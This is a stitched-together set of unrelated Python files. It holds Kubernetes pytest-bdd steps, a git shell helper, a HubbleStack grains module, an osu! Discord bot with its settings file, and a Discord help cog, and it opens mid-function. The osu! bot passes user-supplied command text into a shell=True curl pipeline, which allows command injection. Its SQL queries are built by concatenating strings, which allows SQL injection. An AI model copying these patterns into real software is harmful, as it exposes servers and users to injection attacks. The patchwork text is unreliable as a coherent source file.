    assert len(cmd_res.strip()) > 0, 'No {0} found in namespace {1}'.format(                    
            resource, namespace)


@then(parsers.parse(
    "we can exec '{command}' in the pod labeled '{label}' "
    "in the '{namespace}' namespace"))
def check_exec(host, command, label, namespace):
    candidates = kube_utils.get_pods(host, label, namespace)

    assert len(candidates) == 1, (
        "Expected one (and only one) pod with label {l}, found {f}"
    ).format(l=label, f=len(candidates))

    pod = candidates[0]

    cmd = ' '.join([                    
        'kubectl',                    
        '--kubeconfig=/etc/kubernetes/admin.conf',                    
        'exec',                    
        '--namespace {0}'.format(namespace),                    
            pod['metadata']['name'],
            command,
    ])                    

    with host.sudo():                    
        host.check_output(cmd)                    


@then(parsers.parse(
    "we have at least {min_pods_count:d} running pod labeled '{label}'"))
def count_running_pods(host, min_pods_count, label):
    def _check_pods_count():
        pods = kube_utils.get_pods(
            host,
            label,
            namespace="kube-system",
            status_phase="Running",
        )

        assert len(pods) >= min_pods_count

    utils.retry(_check_pods_count, times=10, wait=3)

from pytest_bdd import scenario, then

# Scenarios
@scenario('../features/log_accessible.feature', 'get logs')
def test_logs(host):
    pass


@then("the pods logs should not be empty")
def check_logs(host):
    with host.sudo():
        cmd = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'                    
               ' get pods -n kube-system'
               ' --no-headers -o custom-columns=":metadata.name"')
        pods_list = host.check_output(cmd)                    
        for pod_id in pods_list.split('\n'):
            cmd_logs = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'                    
                        ' logs {} --limit-bytes=1 -n kube-system'.format(
                            pod_id))                    
            res = host.check_output(cmd_logs)                    
            if 'salt-master' not in pod_id:
                assert len(res.strip()) > 0, (                    
                    'Error cannot retrieve logs for {}'.format(pod_id))                    

# -*- coding: utf-8 *-
"""
Run Git commands in separate processes
"""
import shlex                    
import subprocess
from os import path
from typing import Dict

from .printing import print_green
from .printing import print_yellow


def shell(command: str) -> str:
    """Execute shell command

    Arguments:
        command {str} -- to execute in shell

    Returns:
        str -- output of the shell
    """
    cmd = shlex.split(command)                    
    output_lines = subprocess.check_output(cmd).decode('utf-8').split('\n')                    
    for index, line in enumerate(output_lines):
        if '*' in line:
            output_lines[index] = f'\033[93m{line}\033[0m'
    return '\n'.join(output_lines)


def shell_first(command: str) -> str:
    """Execute in shell

    Arguments:
        command {str} -- to execute in shell

    Returns:
        str -- first line of output                    
    """
    cmd = shlex.split(command)                    
    return subprocess.check_output(cmd).decode('utf-8').split('\n')[0]                    


def hard_reset(repo_path: str) -> str:
    """reset --hard

    Arguments:
        repo_path {str} -- path to repo to reset
    """
    return shell(f'git -C {repo_path} reset --hard')


def get_branches_info(repo_path: str) -> str:
    """git branch -a

    Arguments:
        repo_path {str} -- path to repo
    """
    return shell(f'git -C {repo_path} branch -a')


def fetch_repo(working_directory: str, name: str, url: str, summery_info: Dict[str, str]) -> None:
    """Clone / Fetch repo

    Arguments:
        working_directory {str} -- target directory
        name {str} -- repo name
        url {str} -- repo url in gitlab
        summery_info {Dict[str, str]} -- the result of the cloning/fetching
    """
    repo_path = path.join(working_directory, name)
    if path.isdir(repo_path):
        print_green(f'Fetching {name}')
        shell_first(f'git -C {repo_path} fetch')
        remote_banches = shell_first(f'git -C {repo_path} ls-remote --heads')
        current_branch = shell_first(
            f'git -C {repo_path} rev-parse --abbrev-ref HEAD --',
        )
        if f'refs/heads/{current_branch}' in remote_banches:
            shell_first(
                f'git -C {repo_path} fetch -u origin {current_branch}:{current_branch}',
            )
        else:
            print_yellow(f'{current_branch} does not exist on remote')

        if ('refs/heads/develop' in remote_banches and current_branch != 'develop'):
            shell_first(f'git -C {repo_path} fetch origin develop:develop')
    else:
        print_green(f'Cloning {name}')
        shell_first(f'git clone {url} {name}')
        current_branch = shell_first(
            f'git -C {repo_path} rev-parse --abbrev-ref HEAD --',
        )
    summery_info.update({name: current_branch})


def any_match(poll_result, expected):
    if poll_result.exception != "None":
        return False

    host = poll_result.answer.split('.')[3]                    
    return host in expected


def task_successful(poll_result, expected):                    
    """
    Determines if a task was successful by checking that the last character
    in the output is '0'.

    Typically a command should invoke 'echo $?' to get the return status of the
    last command.
    """
    if poll_result.output is None:
        return False

    output = poll_result.output[0]                    
    return output[-2] == '0'                    


'''
HubbleStack Custom Grains and Pillar

Allows for fetching custom grain and pillar data from a local salt-minion via
salt-call

:maintainer: HubbleStack
:platform: All
:requires: SaltStack
'''

import re
import salt.modules.cmdmod
import logging

log = logging.getLogger(__name__)

__salt__ = {
        'cmd.run': salt.modules.cmdmod._run_quiet,
        'config.get': salt.modules.config.get,
}


def populate_custom_grains_and_pillar():
    '''
    Populate local salt-minion grains and pillar fields values as specified in
    config file.

    For example:

        custom_grains_pillar:
          grains:
            - selinux: selinux:enabled
            - release: osrelease
          pillar:
            - ntpserver: network_services:ntpserver

    Note that the core grains are already included in hubble grains -- this
    is only necessary for custom grains and pillar data.
    '''
    log.debug('Fetching custom grains and pillar details')
    grains = {}
    salt.modules.config.__opts__ = __opts__
    custom_grains = __salt__['config.get']('custom_grains_pillar:grains', [])
    for grain in custom_grains:
        for key in grain:
            if _valid_command(grain[key]):                    
                value = __salt__['cmd.run']('salt-call grains.get {0}'.format(grain[key])).split('\n')[1].strip()                    
                grains[key] = value                    
    custom_pillar = __salt__['config.get']('custom_grains_pillar:pillar', [])
    for pillar in custom_pillar:
        for key in pillar:
            if _valid_command(pillar[key]):                    
                value = __salt__['cmd.run']('salt-call pillar.get {0}'.format(pillar[key])).split('\n')[1].strip()                    
                grains[key] = value                    
    log.debug('Done with fetching custom grains and pillar details')
    return grains


def _valid_command(string):                    
    '''
    Check for invalid characters in the pillar or grains key                    
    '''
    invalid_characters = re.findall('[^a-zA-Z0-9:_-]',string)                    
    if len(invalid_characters) > 0:                    
        log.info("Command: {0} contains invalid characters: {1}".format(string, invalid_characters))                    
        return False                    
    else:
        return True                    

# -*- coding: utf-8 -*-
"""
Created on Sat May 20 22:39:26 2017

@author: Renondedju
"""
import discord
import asyncio
import sys
import subprocess
import sqlite3
import re
from datetime import datetime
from osuapi import OsuApi, ReqConnector
import requests
import constants

#Uso !#7507

client = discord.Client()
commandPrefix = constants.Settings.commandPrefix

api = OsuApi(constants.Api.osuApiKey, connector=ReqConnector())

mainChannel = None
logsChannel = None
databasePath = constants.Paths.beatmapDatabase

def return_user_rank(discordId):
	if not discordId == constants.Settings.ownerDiscordId:
		conn = sqlite3.connect(databasePath)
		cursor = conn.cursor()
		cursor.execute("SELECT rank FROM users WHERE discordId = " + str(discordId))                    
		try:
			rank = cursor.fetchall()[0][0]
		except IndexError:
			rank = 'USER'
		print (rank)
		conn.close()
		if rank == "":
			rank = "USER"
		return rank
	return 'MASTER'

def refresh_all_pp_stats():
	conn = sqlite3.connect(databasePath)
	cursor = conn.cursor()
	cursor.execute("SELECT DiscordId, OsuId FROM users")
	usersToRefresh = cursor.fetchall()
	for user in usersToRefresh:
		update_pp_stats(user[1], user[0])

def update_pp_stats(osuId, discordId):
	try:
		pp_average = get_pp_stats(osuId)
		if pp_average == False:
			return 1
		conn = sqlite3.connect(databasePath)
		cursor = conn.cursor()
		cursor.execute("UPDATE users SET ppAverage = " + str(pp_average) + " WHERE DiscordId = " + str(discordId))                    
		conn.commit()
		print ("Pp stats updated for osuId : " + str(osuId) + " with discordId : " + str(discordId) + " - PP average = " + str(pp_average))
		return 0
	except:
		return 2

def get_pp_stats(osuId):
	global api
	try:
		results = api.get_user_best(osuId, limit = 20)
		pp_average = 0
		for beatmap in results:
			for item in beatmap:
				if item[0] == 'pp':
					pp_average += item[1]
		pp_average = pp_average/20
		return pp_average
	except:
		return False

def link_user(discordId, osuName, osuId, rank):
	result = ""
	print ("Linking : discordId : " + str(discordId) + ", osuName : " + osuName + ", osuId : " + str(osuId) + " to Database.", end = " ")
	conn = sqlite3.connect(databasePath)
	cursor = conn.cursor()
	cursor.execute("SELECT * FROM users WHERE discordId = " + str(discordId))                    
	if len(cursor.fetchall()) == 0:
		cursor.execute("""
		INSERT INTO users (discordId, osuName, osuId, rank) 
		VALUES (?, ?, ?, ?)
		""", (discordId, osuName, osuId, rank))
		conn.commit()
		print ("Added")
		result = "linked"
	else:
		cursor.execute("UPDATE users SET osuName = '" + osuName + "', osuId = " + str(osuId) + ", rank = '" + rank + "' WHERE discordId = " + str(discordId))                    
		conn.commit()
		print("Updated")
		result = "updated"
	conn.close()
	return result

def add_beatmap_to_queue(url):
	if not(url in new_beatmap_list):
		new_beatmaps_file = open("/home/pi/DiscordBots/OsuBot/beatmapsFiles/newBeatmaps.txt", "a")
		new_beatmaps_file.write('\n' + url)
		new_beatmaps_file.close()
		print ("Added " + url + " to beatmap queue")

def return_simple_beatmap_info(url, oppaiParameters):
	url = url.replace('/b/', '/osu/').split("&", 1)[0]
	if oppaiParameters == "":
		command = "curl " + url + " | /home/pi/DiscordBots/Oppai/oppai/oppai -"
	else:
		command = "curl " + url + " | /home/pi/DiscordBots/Oppai/oppai/oppai - " + oppaiParameters

	return get_infos(subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True).stdout.read())

def return_beatmap_infos(url, oppaiParameters):
	#https://osu.ppy.sh/osu/37658
	url = url.replace('/b/', '/osu/').split("&", 1)[0]
	if oppaiParameters == "":
		command = "curl " + url + " | /home/pi/DiscordBots/Oppai/oppai/oppai -"
	else:
		command = "curl " + url + " | /home/pi/DiscordBots/Oppai/oppai/oppai - " + oppaiParameters

	#print (command)
	p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
	raw_data = p.stdout.read()
	pp_100, name, combo, stars, diff_params = get_infos(raw_data)
	if pp_100 == -1:
		pp_100 = pp_95 = name = combo = stars = diff_params = -1
		return pp_100, pp_95, name, combo, stars, diff_params
	else:
		p = subprocess.Popen(command + " 95%", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
		raw_data = p.stdout.read()
		pp_95, _, _, _, _ = get_infos(raw_data)
		return pp_100, pp_95, name, combo, stars, diff_params

def get_infos(row_datas):
	try:
		split_data = row_datas.split(b'\n')
		pp = split_data[35].replace(b'pp', b'').decode("utf-8")
		name = split_data[14].replace(b' - ', b'').decode("utf-8")
		combo = split_data[16].split(b'/')[0].decode("utf-8")
		stars = split_data[22].replace(b' stars', b'').decode("utf-8")
		diff_params = split_data[15].decode("utf-8")
		return pp, name, combo, stars, diff_params
	except:
		pp = name = combo = stars = diff_params = -1
		return pp, name, combo, stars, diff_params

def Log(user, message, logLevel):
	if logLevel == 0:
		logLevel = "INFO : "
		discordLogLevel = "INFO : "
	elif logLevel == 1:
		logLevel = "! WARNING : "
		discordLogLevel = "**WARNING : **"
	else:
		logLevel = "!! ERROR : "
		discordLogLevel = "__**ERROR : **__"
	i = datetime.now()
	date = i.strftime('%Y/%m/%d %H:%M:%S')
	LogFile = open(constants.Paths.logsFile, "a")

	fileOutput = str(logLevel) + str(date) + " -" + str(user) + " : " + str(message)
	LogFile.write(fileOutput + "\n")
	discordOutput = str(discordLogLevel) + str(date) + " -" + str(user) + " : " + str(message)
	LogFile.close()
	return discordOutput

@client.event
async def on_ready():
	global mainChannel, logsChannel, visible, databasePath
	mainChannel = client.get_server(constants.Settings.mainServerID).get_channel(constants.Settings.mainChannelId)
	logsChannel = client.get_server(constants.Settings.mainServerID).get_channel(constants.Settings.logsChannelId)
	print('Logged in !')
	await asyncio.sleep(0.1)
	hello = False
	if datetime.now().strftime('%H') == "00" or (set(sys.argv) & set(["refresh"])):
		message = await client.send_message(mainChannel, "<:empty:317951266355544065> Updating stats ...")
		try:
			print('Refreshing users stats ...')
			refresh_all_pp_stats()
			print(" - Done")
			await client.edit_message(message, "<:check:317951246084341761> Updating stats ... Done !")
		except:
			await client.edit_message(message, "<:xmark:317951256889131008> Updating stats ... Fail !")
		if not set(sys.argv) & set(["dev"]):
			await client.send_message(mainChannel, "<:online:317951041838514179> Uso!<:Bot:317951180737347587> is now online !")
			await client.change_presence(status=discord.Status('online'), game=discord.Game(name='Osu !'))                    
			hello = True
	print ('Ready !')
	if (set(sys.argv) & set(["online"])) and hello == False:
		await client.send_message(mainChannel, "<:online:317951041838514179> Uso!<:Bot:317951180737347587> is now online !")
		await client.change_presence(status=discord.Status('online'), game=discord.Game(name='Osu !'))                    
	if set(sys.argv) & set(["dev"]):
		await client.change_presence(status=discord.Status('idle'), game=discord.Game(name='Dev mode'))
 
@client.event
async def on_message(message):
	global api, visible

	rank = 'USER'
	if message.content.startswith(commandPrefix):
		rank = return_user_rank(message.author.id)
		await client.send_message(logsChannel, Log(str(message.author), message.content, 0))
	channel = message.channel
	if message.content.startswith(commandPrefix) and message.channel.is_private == False and message.content.startswith(commandPrefix + 'mute') == False:
		conn = sqlite3.connect(databasePath)
		cursor = conn.cursor()
		cursor.execute("SELECT state FROM muted WHERE serverID = " + str(message.server.id))                    
		if cursor.fetchall()[0][0] == 'on':
			channel = message.author
		else:
			channel = message.channel

	if message.content.startswith(commandPrefix + 'test') and (rank in ['MASTER']):
		await client.send_message(message.channel, "Hi ! " + str(message.author) + " my command prefix is '" + commandPrefix + "'")
		#Hey !

	if (message.content.startswith(commandPrefix + 'recomandation') or message.content.startswith(commandPrefix + 'r')) and (rank in ['USER', 'ADMIN', 'MASTER']):
		conn = sqlite3.connect(databasePath)
		cursor = conn.cursor()
		cursor.execute("SELECT ppAverage FROM users WHERE DiscordId = " + str(message.author.id))                    
		try:
			result = cursor.fetchall()[0][0]
		except:
			result = None
		if not(result == None):
			pp_average = int(result*0.97)
			if (pp_average == 0):
				await client.send_message(channel, "Please run the *" + commandPrefix + "update_pp_stats* command to set your stats for the first time in our database")
			else:
				pp_average_fluctuation = pp_average*0.05

				cursor.execute("Select recomendedBeatmaps From users where DiscordId = " + str(message.author.id))                    
				alreadyRecomendedId = cursor.fetchall()[0][0]

				if alreadyRecomendedId == None:
					alreadyRecomendedId = "00000"

				cursor.execute("Select * from beatmaps where pp_95 >= " + str(pp_average-pp_average_fluctuation) + " and pp_95 <= " + str(pp_average+pp_average_fluctuation) + " and id not in(" + alreadyRecomendedId + ") Limit 1")                    

				recomendedBeatmap = cursor.fetchall()[0]
				url = recomendedBeatmap[0]
				name = recomendedBeatmap[1]
				diff_params = recomendedBeatmap[2]
				pp_100 = recomendedBeatmap[3]
				pp_95 = recomendedBeatmap[4]
				stars = recomendedBeatmap[5]
				combo = recomendedBeatmap[6]
				recomendedId = recomendedBeatmap[7]

				alreadyRecomendedId += "," + str(recomendedId)

				cursor.execute("UPDATE users SET recomendedBeatmaps = '" + alreadyRecomendedId + "' where DiscordId = '" + str(message.author.id) + "'")                    
				conn.commit()
				conn.close()

				pp_98, _, _, _, _ = return_simple_beatmap_info(url, " 98%")

				description = "__100% pp__ : " + str(pp_100) + "\n" + "__98% pp__ : " + str(pp_98) + "\n" + "__95% pp__ : " + str(pp_95) + "\n" + "__Max Combo__ : " + str(combo) + "\n" + "__Stars__ : " + str(stars) + "\n" + str("*" + diff_params.upper() + "*")
				em = discord.Embed(title=str(name), description=description, colour=0xf44242, url=url)
				await client.send_message(channel, embed=em)
				print (recomendedBeatmap)
		else:
			await client.send_message(channel, "Uhh sorry, seems like you haven't linked your osu! account...\nPlease use the command *" + commandPrefix + "link_user 'Your osu username' or 'your osu Id'* to link the bot to your osu account !\nEx. " + commandPrefix + "link_user Renondedju")

	if message.content.startswith(commandPrefix + 'add_beatmap') and (rank in ['ADMIN', 'MASTER']):
		if (message.content.replace(commandPrefix + "add_beatmap ", "") == "" or not(message.content.replace(commandPrefix + "add_beatmap ", "")[0:19] == "https://osu.ppy.sh/")):
			await client.send_message(message.channel, "Invalid url !")                    
		else:
			pp_100, pp_95, name, combo, stars, diff_params = return_beatmap_infos(message.content.replace(commandPrefix + "add_beatmap ", ""))
			conn = sqlite3.connect(databasePath)
			cursor = conn.cursor()
			try:
				cursor.execute("""INSERT INTO "beatmaps" (url, name, diff_params, pp_100, pp_95, stars, combo, id) VALUES(?, ?, ?, ?, ?, ?, ?, ?)""", (message.content.replace(commandPrefix + "add_beatmap ", ""), name, diff_params, pp_100, pp_95, stars, combo, message.content.replace(commandPrefix + "add_beatmap ", "").replace("https://osu.ppy.sh/b/", "").replace("&m=0", "")))
				conn.commit()
				conn.close()
				await client.send_message(message.channel, "Addition done !")
			except sqlite3.IntegrityError:
				await client.send_message(message.channel, "This map is already in the Database !")
	
	if message.content.startswith(commandPrefix + 'add_beats') and (rank in ['MASTER']):

		if str(message.author.id) == constants.Settings.ownerDiscordId:

			await client.send_message(logsChannel, Log(str(message.author), message.content, 0))

			beatmapfile = open(message.content.replace(commandPrefix + 'add_beats ', ""), "r")
			beatmapToProcess = beatmapfile.read().split('\n')
			await client.send_message(message.channel, "<:streaming:317951088646946826> Starting the import of " + str(len(beatmapToProcess)) + " beatmaps")
			await asyncio.sleep(0.1)
			await client.change_presence(status=discord.Status('dnd'), game=discord.Game(name='Processing ...'))

			conn = sqlite3.connect(databasePath)

			await client.send_message(logsChannel, Log(str(message.author), "Ready to add " + str(len(beatmapToProcess)) + " beatmaps to the Database", 1))

			cursor = conn.cursor()
			processed = 1
			done = 0
			infoError = 0
			alreadyExists = 0
			for beatmapUrl in beatmapToProcess:

				print ("Processing " + beatmapUrl + " - " + str(processed) + "/" + str(len(beatmapToProcess)), end="")
				cursor.execute("select url from beatmaps where url = '" + beatmapUrl + "'")                    
				if len(cursor.fetchall()) == 0:
					pp_100, pp_95, name, combo, stars, diff_params = return_beatmap_infos(beatmapUrl, "")
					if not (pp_100 == -1):
						try:
							cursor.execute("""INSERT INTO "beatmaps" (url, name, diff_params, pp_100, pp_95, stars, combo, id) VALUES(?, ?, ?, ?, ?, ?, ?, ?)""", (beatmapUrl, name, diff_params, pp_100, pp_95, stars, combo, beatmapUrl.replace("https://osu.ppy.sh/b/", "").replace("&m=0", "")))
							conn.commit()
							print (" - Done")
							await client.send_message(logsChannel, "<:check:317951246084341761> " + beatmapUrl + " ( "+str(processed) + "/" + str(len(beatmapToProcess))  +" ) - Done")
							done += 1
						except sqlite3.IntegrityError:
							print (" - Can't get beatmap infos !")
							await client.send_message(logsChannel, "<:xmark:317951256889131008> " + beatmapUrl + " ( "+str(processed) + "/" + str(len(beatmapToProcess))  +" ) - Can't get beatmap infos !")
							infoError += 1
					else:
						print (" - Can't get beatmap infos !")
						await client.send_message(logsChannel, "<:xmark:317951256889131008> " + beatmapUrl + " ( "+str(processed) + "/" + str(len(beatmapToProcess))  +" ) - Can't get beatmap infos !")
						infoError += 1
				else:
					print (" - Already exists")
					await client.send_message(logsChannel, "<:xmark:317951256889131008> " + beatmapUrl + " ( "+str(processed) + "/" + str(len(beatmapToProcess))  +" ) - Already exists")
					alreadyExists += 1
				processed += 1
			conn.close()

			await client.send_message(logsChannel, Log(str(message.author),  "Successfuly added " + str(len(beatmapToProcess)) + " beatmaps to the database", 1))
			await client.send_message(message.channel, "<:online:317951041838514179> Back online ! - __Done :__ " + str(done) + " , __InfoError :__ " + str(infoError) + " , __Already exists :__ " + str(alreadyExists))
			await asyncio.sleep(0.1)
			await client.change_presence(status=discord.Status('online'), game=discord.Game(name='Osu !'))                    

		else:
			await client.send_message(logsChannel, Log(str(message.author), "tried to add multiple beatmaps", 1))
			await client.send_message(message.channel, "Sorry, Only Renondedju can do this !")

	if message.content.startswith(commandPrefix + 'mute') and (rank in ['USER', 'ADMIN', 'MASTER']) and (message.channel.permissions_for(message.author).administrator == True or str(message.author) == "Renondedju#0204"):
		if not (message.server.id == None):
			conn = sqlite3.connect(databasePath)
			cursor = conn.cursor()
			try :
				parameter = message.content.split(' ')[1]
			except:
				parameter = ''
			if parameter.lower() in ['on', 'off']:
				parameter = parameter.lower()
				cursor.execute("SELECT * FROM muted WHERE serverID = " + str(message.server.id))                    
				if len(cursor.fetchall()) == 0:
					cursor.execute("INSERT INTO muted (serverID, state) VALUES (?, ?)", (message.server.id, parameter))
				else:
					cursor.execute("UPDATE muted SET state = '" + parameter + "' WHERE serverID = " + str(message.server.id))                    
				await client.send_message(message.channel, "Done !")
				conn.commit()
			else:
				await client.send_message(message.channel, "Wrong argument (expected 'on' or 'off')")
			conn.close()
		else:
			await client.send_message(message.channel, "You can't execute this command here (servers only)")

	if message.content.startswith(commandPrefix + 'pp') and (rank in ['USER', 'ADMIN', 'MASTER']):
		parameters = message.content.replace(commandPrefix + "pp ", "")
		url = parameters.split(" ")[0]
		try:
			oppaiParameters = parameters.split(" ")[1:len(parameters.split(" "))]
			oppaiParameters = " ".join(str(x) for x in oppaiParameters)
		except IndexError:
			oppaiParameters = ""

		if (parameters == "" or not(url[0:19] == "https://osu.ppy.sh/")):
			await client.send_message(channel, "Invalid url !")
		else:
			pp_100, pp_95, name, combo, stars, diff_params = return_beatmap_infos(url, oppaiParameters)
			
			if not(pp_100 == -1):

				add_beatmap_to_queue(url)
				await client.send_message(client.get_server("310348632094146570").get_channel("315166181256593418"), Log(str(client.user.name), "Added " + url + " to beatmap queue", 0))
				description = "__100% pp__ : " + str(pp_100) + "\n" + "__95% pp__ : " + str(pp_95) + "\n" + "__combo max__ : " + str(combo) + "\n" + "__stars__ : " + str(stars) + "\n" + str("*" + diff_params + "*")
				em = discord.Embed(title=str(name), description=description, colour=0xf44242)
				await client.send_message(channel, embed=em)
			else:
				await client.send_message(channel, "Can't get beatmap info...")

	if message.content.startswith(commandPrefix + 'kill') and (rank in ['MASTER']):
		if str(message.author.id) == constants.Settings.ownerDiscordId:
			await client.send_message(logsChannel, Log(str(client.user.name), "Killing the bot !", 0))
			await client.send_message(message.channel, "Alright, killing myself ... bye everyone !")
			client.logout()
			client.close()
			sys.exit("Bot has been shutdown by command correctly !")
		else:
			await client.send_message(logsChannel, Log(str(message.author), "tried to kill the bot !", 1))
			await client.send_message(message.channel, "Sorry, Only Renondedju can do this !")

	if message.content.startswith(commandPrefix + 'user') and (rank in ['USER', 'ADMIN', 'MASTER']):
		parameters = message.content.split(' ')
		results = api.get_user(parameters[1])
		if results == []:
			results = api.get_user(int(parameters[1]))
		stats = []
		if not (results == []):
			for item in results[0]:
				stats.append(item)
			description = "Accuracy: " + str(stats[0][1])[0:4] + "\npp: " + str(stats[13][1]) + "\nCountry: " + stats[7][1] + "\nLevel: " + str(stats[9][1])[0:4] + "\nPlays: " + str(stats[10][1]) + "\nRank: " + str(stats[12][1]) + "\nCountry rank: " + str(stats[11][1])
			em = discord.Embed(title=str(stats[17][1]), description=description, colour=0xf44242, url="https://new.ppy.sh/u/" + str(stats[16][1]) + "#osu").set_footer(text="https://new.ppy.sh/u/" + str(stats[16][1]) + "#osu")
			await client.send_message(channel, embed=em)
		else:
			await client.send_message(channel, "User not found!")

	if message.content.startswith(commandPrefix + 'link_user') and (rank in ['USER', 'ADMIN', 'MASTER']):
		parameters = message.content.replace(commandPrefix + 'link_user ', '')
		try:
			results = api.get_user(parameters)
			if results == []:
				results = api.get_user(int(parameters))
				print(results)
		except IndexError:
			await client.send_message(channel, "Something went wrong ...")

		stats = []
		if not (results == []):
			for item in results[0]:
				stats.append(item)
			osuId = stats[16][1]
			osuUsername = stats[17][1]
			userDiscordId = int(message.author.id)
			operationDone = link_user(userDiscordId, osuUsername, osuId, "USER")
			description = "Accuracy: " + str(stats[0][1])[0:4] + "\npp: " + str(stats[13][1]) + "\nCountry: " + stats[7][1] + "\nLevel: " + str(stats[9][1])[0:4] + "\nPlays: " + str(stats[10][1]) + "\nRank: " + str(stats[12][1]) + "\nCountry rank: " + str(stats[11][1])
			em = discord.Embed(title=str(stats[17][1]), description=description, colour=0xf44242, url="https://new.ppy.sh/u/" + str(stats[16][1]) + "#osu").set_footer(text="https://new.ppy.sh/u/" + str(stats[16][1]) + "#osu")

			await client.send_message(channel, "Your account has been successfuly " + operationDone + " to ")
			await client.send_message(logsChannel, Log(str(client.user.name), "Your account has been successfuly " + operationDone + " to osu! username '" + stats[17][1] + "'", 0))
			await client.send_message(channel, embed=em)
			if operationDone == "linked":
				await client.send_message(channel, "Please wait while I'm updating your stats ...")

				if update_pp_stats(osuId, message.author.id) == 0:
					await client.send_message(logsChannel, Log(str(client.user.name), "Successfuly updated " + str(message.author) + "'s pp stats", 0))
					await client.send_message(channel, "Successfuly updated " + str(message.author) + "'s pp stats")

				else:
					await client.send_message(logsChannel, Log(str(client.user.name), "Unexpected error for " + str(message.author), 2))
					await client.send_message(channel, "Unexpected error, please try again later or contact Renondedju for more help")
		else:
			await client.send_message(logsChannel, Log(str(client.user.name), "User not found", 0))
			await client.send_message(channel, "User not found!")

	if message.content.startswith(commandPrefix + 'update_pp_stats') and (rank in ['USER', 'ADMIN', 'MASTER']):
		conn = sqlite3.connect(databasePath)
		cursor = conn.cursor()
		cursor.execute("SELECT OsuId FROM users WHERE DiscordId = " + str(message.author.id))                    
		osuId = cursor.fetchall()[0][0]
		conn.close()
		if not (osuId == None):
			result = update_pp_stats(osuId, message.author.id)
			if result == 0:
				await client.send_message(logsChannel, Log(str(client.user.name), "Succesfuly updated " + str(message.author) + "'s pp stats", 0))
				await client.send_message(channel, "Succesfuly updated " + str(message.author) + "'s pp stats")
			elif result == 1:
				await client.send_message(logsChannel, Log(str(client.user.name), "Wrong osu! id for " + str(message.author), 1))
				await client.send_message(channel, "Wrong osu! id for " + str(message.author) + ". Try to link your account with an osu! account by typing the command *" + commandPrefix + "link_user 'Your osu username'*")
			elif result == 2:
				await client.send_message(logsChannel, Log(str(client.user.name), "Unexpected error for " + str(message.author), 2))
				await client.send_message(channel, "Unexpected error, please try again later or contact Renondedju for more help")
		else:
			await client.send_message(logsChannel, Log(str(client.user.name), "Wrong osu! id for " + str(message.author), 1))
			await client.send_message(channel, "Wrong osu! id for " + str(message.author) + ". Try to link your account with an osu account by typing the command *" + commandPrefix + "link_user 'Your osu username'*")

	if message.content.startswith(commandPrefix + 'help') and (rank in ['USER', 'ADMIN', 'MASTER']):
		if rank == 'ADMIN':
			helpfile = open(constants.Paths.helpAdminFile, "r")
			helpString = helpfile.read()
			helpfile.close()
			await client.send_message(channel, helpString)
		elif rank == 'MASTER':
			helpfile = open(constants.Paths.helpMasterFile, "r")
			helpString = helpfile.read()
			helpfile.close()
			await client.send_message(channel, helpString)
		else:
			helpfile = open(constants.Paths.helpUserFile, "r")
			helpString = helpfile.read()
			helpfile.close()
			await client.send_message(channel, helpString)

client.run(constants.Api.discordToken)

# -*- coding: utf-8 -*-
"""
This is a setting file created by Renondedju

Evry Api parameters written in this file are private and secret !                     
"""

class Api:
	osuApiKey = "" #Osu api key (can be found here : https://osu.ppy.sh/p/api#)
	discordToken = "" #Discord bot token (https://discordapp.com/developers/applications/me)

class Paths:
	workingDirrectory = "" #The full path to OsuBot.py                    
	beatmapDatabase = workingDirrectory + "Database.db" #Beatmaps database full path
	beatmapsDownloadsTemp = workingDirrectory + "beatmaps/temp" #Full path to the temporary downloads (unused)
	beatmapsDownloadsPermanent = workingDirrectory + "beatmaps/permanent" #Full path to the permanants downloads (unused)
	managmentFiles = workingDirrectory + "Managment" #Full path to the managment files (unused)
	logsFile = workingDirrectory + "logs.txt" #Full path to the log file
	helpMasterFile = workingDirrectory + "helpFiles/helpMASTER.txt"
	helpAdminFile = workingDirrectory + "helpFiles/helpADMIN.txt"
	helpUserFile = workingDirrectory + "helpFiles/helpUSER.txt"

class Settings:
	commandPrefix = "o!" #Commant prefix required to trigger the bot
	mainServerID = "310348632094146570" #Main announce server of the bot
	mainChannelId = "310348632094146570" #Main channel of the bot's server
	logsChannelId = "315166181256593418" #Logs channel of the bot's server
	ownerDiscordId = "213262036069515264" #Discord Id of the bot owner
	mainLang = "en" #Main language of the bot (unused)

import discord
from discord.ext import commands
from sys import argv

class Assistance:
    """
    Commands that will mostly be used in #help-and-questions.
    """
    def __init__(self, bot):
        self.bot = bot
        print('Addon "{}" loaded'.format(self.__class__.__name__))

    async def simple_embed(self, text, title="", color=discord.Color.default()):
        embed = discord.Embed(title=title, color=color)
        embed.description = text
        await self.bot.say("", embed=embed)

    @commands.command(pass_context=True, name="sr", hidden=True)
    async def staffreq(self, ctx, *, msg_request=""):
        """Request staff, with optional additional text. Helpers, Staff, Verified only."""
        author = ctx.message.author
        if (self.bot.helpers_role not in author.roles) and (self.bot.staff_role not in author.roles) and (self.bot.verified_role not in author.roles) and (self.bot.trusted_role not in author.roles):
            msg = "{0} You cannot used this command at this time. Please ask individual staff members if you need help.".format(author.mention)
            await self.bot.say(msg)
            return
        await self.bot.delete_message(ctx.message)
        # await self.bot.say("Request sent.")
        msg = "❗️ **Assistance requested**: {0} by {1} | {2}#{3} @here".format(ctx.message.channel.mention, author.mention, author.name, ctx.message.author.discriminator)
        if msg_request != "":
            # msg += "\n✏️ __Additional text__: " + msg_request
            embed = discord.Embed(color=discord.Color.gold())
            embed.description = msg_request
        await self.bot.send_message(self.bot.mods_channel, msg, embed=(embed if msg_request != "" else None))
        await self.bot.send_message(author, "✅ Online staff has been notified of your request in {0}.".format(ctx.message.channel.mention), embed=(embed if msg_request != "" else None))

    @commands.command(pass_context=True)
    @commands.cooldown(rate=1, per=30.0, type=commands.BucketType.channel)
    async def guide(self, ctx, *, console="auto"):
        """Links to Plailect's or FlimFlam69's guide."""
        console = console.lower()
        if console == "3ds" or (console == "auto" and "wiiu" not in ctx.message.channel.name):
            embed = discord.Embed(title="Guide", color=discord.Color(0xCE181E))
            embed.set_author(name="Plailect", url="https://3ds.guide/")
            embed.set_thumbnail(url="https://3ds.guide/images/bio-photo.png")
            embed.url = "https://3ds.guide/"
            embed.description = "A complete guide to 3DS custom firmware, from stock to boot9strap."
            await self.bot.say("", embed=embed)
